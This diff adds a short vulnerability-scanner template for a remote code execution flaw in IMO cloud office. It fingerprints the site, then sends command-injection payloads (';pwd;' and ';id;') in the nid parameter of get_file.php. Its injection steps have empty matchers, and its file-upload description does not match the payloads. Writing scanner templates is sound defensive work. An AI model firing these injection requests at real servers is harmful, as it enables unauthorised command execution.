@@ -1,0 +1,28 @@
+id: imo-rce
+brief:
+    title: IMO - Remote Code Execution
+    by: ritikchaddha
+    level: critical
+    about: The lax filtering of imo cloud office/file/NDisk/get_file.php allows unlimited file uploads. Attackers can directly obtain website permissions through this vulnerability.
+    label:
+        - imo
+        - rce
+        - vuln
+    score: CVSS:9.8
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/'
+      signs:
+        - "on": word
+          has:
+            - imo
+          in: body
+    - verb: GET
+      to:
+        - '{{BaseURL}}/file/NDisk/get_file.php?cid=1&nid=;pwd;'
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/file/NDisk/get_file.php?cid=1&nid=;id;'
+      signs: []
